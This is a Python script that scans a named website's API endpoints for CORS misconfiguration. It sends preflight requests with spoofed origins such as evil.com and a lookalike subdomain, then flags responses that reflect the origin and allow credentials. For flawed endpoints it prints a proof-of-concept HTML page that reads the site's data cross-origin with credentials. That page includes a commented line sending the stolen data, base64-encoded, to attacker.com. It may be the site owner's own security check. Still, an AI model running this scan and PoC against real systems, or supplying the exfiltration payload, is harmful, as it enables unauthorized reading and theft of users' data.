import urllib.request
import urllib.error
import ssl
import json
import time

TARGET = "https://worldviewosint.com"
ctx = ssl.create_default_context()

ORIGINS = [
    "https://evil.com",
    "https://attacker.example.com",
    "http://localhost:8080",
    "https://worldviewosint.com.evil.com",
    "https://sub.worldviewosint.com",
    "null",
    "https://google.com",
    "file://",
    "",
]

ENDPOINTS = [
    "/api/health",
    "/api/osint/conflicts",
    "/api/osint/maritime",
    "/api/osint/aviation",
    "/api/ai/status",
    "/api/telegram/report",
]

results = []

print("=== CORS ORIGIN REFLECTION ANALYSIS ===\n")
print(f"{'Origin':<45} {'Endpoint':<30} {'ACAO':>10} {'Creds':>6} {'Methods'}")
print("-" * 130)

for origin in ORIGINS:
    for ep in ENDPOINTS:
        url = TARGET + ep
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        if origin:
            headers["Origin"] = origin

        try:
            req = urllib.request.Request(url, method="OPTIONS", headers=headers)
            if origin:
                req.add_header("Access-Control-Request-Method", "GET")
                req.add_header("Access-Control-Request-Headers", "Authorization")
            resp = urllib.request.urlopen(req, timeout=10, context=ctx)

            acao = resp.headers.get("Access-Control-Allow-Origin", "(none)")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "(none)")
            acam = resp.headers.get("Access-Control-Allow-Methods", "(none)")
            acah = resp.headers.get("Access-Control-Allow-Headers", "(none)")

            reflected = acao == origin if origin else False
            vuln = reflected and acac == "true"

            tag = " [VULN]" if vuln else " [REFLECTED]" if reflected else ""

            print(f"  {(origin or '(no origin)'):<43} {ep:<28} {acao:>10} {acac:>6} {acam}{tag}")

            results.append({
                "origin": origin or "(none)",
                "endpoint": ep,
                "acao": acao,
                "acac": acac,
                "acam": acam,
                "acah": acah,
                "reflected": reflected,
                "vulnerable": vuln,
            })
        except urllib.error.HTTPError as e:
            acao = e.headers.get("Access-Control-Allow-Origin", "(none)") if e.headers else "(none)"
            acac = e.headers.get("Access-Control-Allow-Credentials", "(none)") if e.headers else "(none)"
            acam = e.headers.get("Access-Control-Allow-Methods", "(none)") if e.headers else "(none)"
            print(f"  {(origin or '(no origin)'):<43} {ep:<28} {acao:>10} {acac:>6} {acam} [{e.code}]")
            results.append({
                "origin": origin or "(none)",
                "endpoint": ep,
                "status": e.code,
                "acao": acao,
                "acac": acac,
                "acam": acam,
                "reflected": acao == origin if origin else False,
            })
        except Exception as e:
            print(f"  {(origin or '(no origin)'):<43} {ep:<28} ERR: {str(e)[:40]}")
        time.sleep(0.3)

vulns = [r for r in results if r.get("vulnerable")]
reflected = [r for r in results if r.get("reflected")]

print(f"\n{'='*60}")
print(f"Total tests: {len(results)}")
print(f"Origin reflected: {len(reflected)}")
print(f"Vulnerable (reflected + credentials): {len(vulns)}")
print(f"{'='*60}")

if vulns:
    print("\n[!!!] VULNERABLE COMBINATIONS:")
    for v in vulns:
        print(f"  Origin: {v['origin']} + {v['endpoint']}")

    print("\n--- PROOF OF CONCEPT ---")
    print("An attacker can host this HTML on any domain to steal OSINT data:")
    print("""
<html>
<body>
<h1>CORS PoC - worldviewosint.com</h1>
<script>
// This runs on attacker.com but reads data from worldviewosint.com
fetch('https://worldviewosint.com/api/osint/conflicts', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    document.getElementById('stolen').textContent = JSON.stringify(data, null, 2);
    // Exfiltrate: new Image().src = 'https://attacker.com/log?data=' + btoa(JSON.stringify(data));
});
</script>
<pre id="stolen">Loading...</pre>
</body>
</html>
""")

with open(r"C:\Users\mmrla\worldviewosnit\logs\cors_analysis.json", "w", encoding="utf-8") as f:
    json.dump(results, f, indent=2)
print("Saved to logs/cors_analysis.json")
